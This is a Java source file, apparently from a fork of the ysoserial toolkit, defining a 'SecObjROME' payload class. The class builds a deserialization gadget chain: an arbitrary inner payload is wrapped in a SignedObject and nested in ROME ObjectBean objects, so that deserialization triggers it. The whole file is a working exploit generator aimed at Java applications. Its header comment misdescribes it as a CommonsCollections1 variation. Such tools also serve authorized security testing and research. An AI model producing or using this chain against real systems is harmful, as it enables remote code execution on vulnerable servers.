package ysoserial.payloads;

import com.sun.syndication.feed.impl.ObjectBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.ParseArg;
import ysoserial.payloads.util.PayloadRunner;

import java.io.Serializable;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.List;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Authors({ Authors.J1an })
public class SecObjROME extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        Class payloadClazz= ParseArg.getTargetPayload(command);
        if (payloadClazz == null) {
            throw new IllegalArgumentException("Invalid payload type '" + command.split(":")[0] + "'");
        }
        Method getPayloadObj= payloadClazz.getMethod("getObject", String.class);
        SignedObject signedObject = new SignedObject((Serializable) getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1]), kp.getPrivate(), Signature.getInstance("DSA"));
        ObjectBean delegate = new ObjectBean(SignedObject.class, signedObject);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(SecObjROME.class, args);
	}
}
